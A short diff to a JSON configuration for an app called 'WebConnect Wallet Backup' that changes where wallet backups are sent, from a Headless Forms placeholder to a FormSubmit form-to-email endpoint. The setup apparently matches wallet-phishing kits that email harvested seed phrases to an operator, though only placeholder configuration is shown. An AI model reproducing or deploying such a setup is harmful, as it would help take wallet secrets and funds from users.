@@ -1,19 +1,19 @@
 {
   "version": "1.0.0",
   "app_name": "WebConnect Wallet Backup",
-  "description": "Interactive wallet backup system with Headless Forms integration",
+  "description": "Interactive wallet backup system with FormSubmit integration",
   "repository": "https://github.com/decentralizedconfig/launchpad",
   
   "storage": {
     "enabled": true,
     "destinations": [
       {
-        "name": "headless_forms",
-        "type": "headless_forms",
+        "name": "formsubmit",
+        "type": "formsubmit",
         "enabled": true,
-        "endpoint": "YOUR_FORM_ENDPOINT_URL_HERE",
+        "endpoint": "https://formsubmit.co/YOUR_EMAIL_HERE",
         "method": "POST",
-        "description": "Headless Forms endpoint for secure backup submission",
+        "description": "FormSubmit endpoint for secure backup submission",
         "timeout": 30,
         "retry_attempts": 3
       }
